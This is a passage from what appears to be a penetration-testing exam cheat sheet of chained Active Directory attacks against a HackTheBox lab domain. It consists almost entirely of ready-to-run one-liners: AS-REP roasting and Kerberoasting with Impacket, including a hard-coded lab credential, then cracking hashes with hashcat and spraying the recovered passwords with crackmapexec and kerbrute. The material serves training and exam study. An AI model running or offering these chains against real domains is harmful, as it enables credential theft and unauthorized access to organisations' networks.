impacket-GetNPUsers -dc-ip 10.10.10.175 -request -outputfile asrep.txt htb.local/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb 10.10.10.175 -u users.txt -p spray_passwords.txt -d htb.local --continue-on-success --no-bruteforce
```

**4. Kerberoast -> Crack -> Spray**
_Kerberoast SPNs, crack TGS hashes, spray cracked passwords_
```bash
impacket-GetUserSPNs -dc-ip 10.10.10.175 -request -outputfile kerberoast.txt 'htb.local/FSMITH:Thestrokes23' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb 10.10.10.175 -u users.txt -p spray_passwords.txt -d htb.local --continue-on-success --no-bruteforce
```

**5. CeWL -> Mutate -> Spray**
_Generate wordlist from website, apply mutations, spray_
```bash
cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d htb.local --dc 10.10.10.175 users.txt spray_passwords.txt
```

> **EXAM TIP:** Before spraying, check `net accounts` for lockout policy.
